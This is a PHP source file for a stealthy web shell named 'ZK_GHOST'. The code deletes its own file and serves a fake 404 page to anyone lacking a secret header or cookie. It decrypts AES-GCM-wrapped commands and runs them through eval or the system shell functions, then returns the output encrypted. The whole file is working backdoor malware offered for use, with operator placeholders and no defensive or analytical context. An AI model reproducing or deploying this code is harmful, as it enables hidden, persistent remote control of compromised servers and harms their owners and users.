<?php
/**
 * Black-Eye-Alpha v6.1 - ZERO-KNOWLEDGE HARDENED GHOST
 * Identity: ZK_GHOST_PHANTOM
 * Operational Mode: GHOST (Zero-Knowledge)
 */

error_reporting(0);
set_time_limit(0);
ignore_user_abort(true);

// 1. SELF-DESTRUCT
@unlink(__FILE__);

class __ZK_GHOST__ {
    private $k;
    private $sn;
    private $cn;
    private $s;

    public function __construct($salt, $hn, $cn) {
        $this->sn = $hn;
        $this->cn = $cn;
        $this->s = $salt;
    }

    private function auth() {
        $trigger = "";
        try {
            if (isset($_SERVER['HTTP_' . strtoupper(str_replace('-', '_', $this->sn))])) {
                $trigger = $_SERVER['HTTP_' . strtoupper(str_replace('-', '_', $this->sn))];
            } else if (isset($_COOKIE[$this->cn])) {
                $trigger = $_COOKIE[$this->cn];
            }
        } catch (Exception $e) { $this->cloak(); }

        if (!$trigger) {
            $this->cloak();
        }

        // 2. KEY WRAPPING (KDF) - Zero-Knowledge
        // No password hash stored. Key derived from runtime trigger + salt.
        $this->k = hash('sha256', $trigger . hex2bin($this->s), true);
    }

    private function cloak() {
        header("HTTP/1.1 404 Not Found");
        echo "<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>";
        exit();
    }

    public function run() {
        $this->auth();
        
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['d'])) {
            try {
                $raw = base64_decode($_POST['d']);
                $cmd = $this->decrypt($raw);
                if ($cmd) {
                    $this->execute($cmd);
                } else {
                    $this->cloak(); // Wrong key = decryption fail = cloak
                }
            } catch (Exception $e) { $this->cloak(); }
        }
    }

    private function decrypt($data) {
        try {
            $nonce_len = 12;
            if (strlen($data) < $nonce_len + 16) return false;

            $nonce = substr($data, 0, $nonce_len);
            $tag = substr($data, -16);
            $ciphertext = substr($data, $nonce_len, -16);

            // Silent fail is built-in to openssl_decrypt returning false on tag mismatch
            return openssl_decrypt($ciphertext, 'aes-256-gcm', $this->k, OPENSSL_RAW_DATA, $nonce, $tag);
        } catch (Exception $e) { return false; }
    }

    private function execute($code) {
        ob_start();
        try {
            if (strpos($code, '<?php') !== false) {
                eval('?>' . $code);
            } else {
                $this->system_exec($code);
            }
        } catch (Exception $e) {}
        $res = ob_get_clean();
        $this->respond($res);
    }

    private function system_exec($cmd) {
        $funcs = ['shell_exec', 'exec', 'system', 'passthru'];
        foreach ($funcs as $f) {
            if (function_exists($f)) {
                @$f($cmd);
                return;
            }
        }
    }

    private function respond($data) {
        try {
            $nonce = openssl_random_pseudo_bytes(12);
            $tag = "";
            $cipher = openssl_encrypt($data, 'aes-256-gcm', $this->k, OPENSSL_RAW_DATA, $nonce, $tag);
            echo base64_encode($nonce . $cipher . $tag);
        } catch (Exception $e) {}
    }
}

$__INIT__ = new __ZK_GHOST__("__SALT_KEY__", "__HEADER_NAME__", "__COOKIE_NAME__");
$__INIT__->run();
?>
